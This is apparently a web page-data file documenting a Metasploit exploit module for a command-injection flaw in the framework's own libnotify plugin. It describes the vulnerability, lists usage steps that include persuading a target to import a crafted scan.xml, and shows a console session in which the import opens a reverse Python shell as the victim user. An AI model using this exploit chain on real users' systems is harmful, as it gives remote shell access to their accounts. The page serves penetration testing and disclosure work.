{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/fileformat/metasploit_libnotify_cmd_injection","result":{"data":{"moduleMetadataJson":{"id":"32b6f19a-e6c9-5a9b-8f7b-7340c5e9babf","name":"Metasploit Libnotify Plugin Arbitrary Command Execution","fullname":"exploit/unix/fileformat/metasploit_libnotify_cmd_injection","description":"This module exploits a shell command injection vulnerability in the\n        libnotify plugin. This vulnerability affects Metasploit versions\n        5.0.79 and earlier.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/fileformat/metasploit_libnotify_cmd_injection","documentationSlug":"/modules/documentation/exploit/unix/fileformat/metasploit_libnotify_cmd_injection","referencesSlug":"/modules/references/exploit/unix/fileformat/metasploit_libnotify_cmd_injection"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Metasploit Framework versions prior to 5.0.86 are vulnerable to a command\ninjection vulnerability in the default <code class=\"language-text\">libnotify</code> plugin. The <code class=\"language-text\">libnotify</code>\nplugin fails to properly parse the argument array to an executed operating\nsystem command. If an attacker can convince a user running an affected version\nof the Metasploit Framework with the <code class=\"language-text\">libnotify</code> plugin loaded to import a\nspecially crafted data file with <code class=\"language-text\">db_import</code>, they can execute a command within\nthe context of the user running Metasploit.</p>\n<p>In order to trigger the vulnerable code path, the service reported must be\nunique. This means that when the exploit file is loaded, it will not trigger the\nvulnerability again unless the service is removed. The easiest way to remove the\nservice is to delete all services from the database using the <code class=\"language-text\">services -d</code>\ncommand.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Example steps in this format (is also in the PR):</p>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/unix/fileformat/metasploit_libnotify_cmd_injection</code></li>\n<li>Set options as appropriate</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Start a payload handler using <code class=\"language-text\">exploit/multi/handler</code></li>\n<li>Transfer the file to the intended target and convince them to open it</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"metasploit-framework-v5076\" style=\"position:relative;\"><a href=\"#metasploit-framework-v5076\" aria-label=\"metasploit framework v5076 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit Framework v5.0.76</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/fileformat/metasploit_libnotify_cmd_injection \nmsf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) &gt; show options \n\nModule options (exploit/unix/fileformat/metasploit_libnotify_cmd_injection):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   FILENAME  scan.xml         no        The file to write.\n\n\nPayload options (cmd/unix/reverse_python):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n   SHELL  /bin/bash        yes       The system shell to use.\n\n   **DisablePayloadHandler: True   (RHOST and RPORT settings will be ignored!)**\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) &gt; exploit\n\n[*] Writing xml file: scan.xml\n[+] scan.xml stored at /home/smcintyre/.msf4/local/scan.xml\nmsf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) &gt; use exploit/multi/handler \nmsf5 exploit(multi/handler) &gt; show options \n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (cmd/unix/reverse_python):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n   SHELL  /bin/bash        yes       The system shell to use.\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.159.128:4444 \n^C[-] Exploit failed [user-interrupt]: Interrupt \n[-] exploit: Interrupted\nmsf5 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 3.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.159.128:4444 \nmsf5 exploit(multi/handler) &gt; version\nFramework: 5.0.76-dev-50cfb07cff\nConsole  : 5.0.76-dev-50cfb07cff\nmsf5 exploit(multi/handler) &gt; load libnotify\n[*] Successfully loaded plugin: libnotify\nmsf5 exploit(multi/handler) &gt; services -d\nServices\n========\n\nhost  port  proto  name  state  info\n----  ----  -----  ----  -----  ----\n\nmsf5 exploit(multi/handler) &gt; db_import /home/smcintyre/.msf4/local/scan.xml\n[*] Importing &#39;Nmap XML&#39; data\n[*] Import: Parsing with &#39;Nokogiri v1.10.8&#39;\n[*] Importing host 192.168.20.121\nsh: line 1: State:: command not found\nsh: line 2: Proto:: command not found\nsh: -c: line 3: unexpected EOF while looking for matching `&#39;&#39;\nsh: -c: line 4: syntax error: unexpected end of file\n[*] Successfully imported /home/smcintyre/.msf4/local/scan.xml\nmsf5 exploit(multi/handler) &gt; [*] Command shell session 4 opened (192.168.159.128:4444 -&gt; 192.168.159.128:35516) at 2020-04-16 14:54:39 -0400\n\nmsf5 exploit(multi/handler) &gt; sessions -i 4\n[*] Starting interaction with 4...\n\nid\nuid=1000(smcintyre) gid=1000(smcintyre) groups=1000(smcintyre),10(wheel),974(wireshark),975(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"32b6f19a-e6c9-5a9b-8f7b-7340c5e9babf"}}}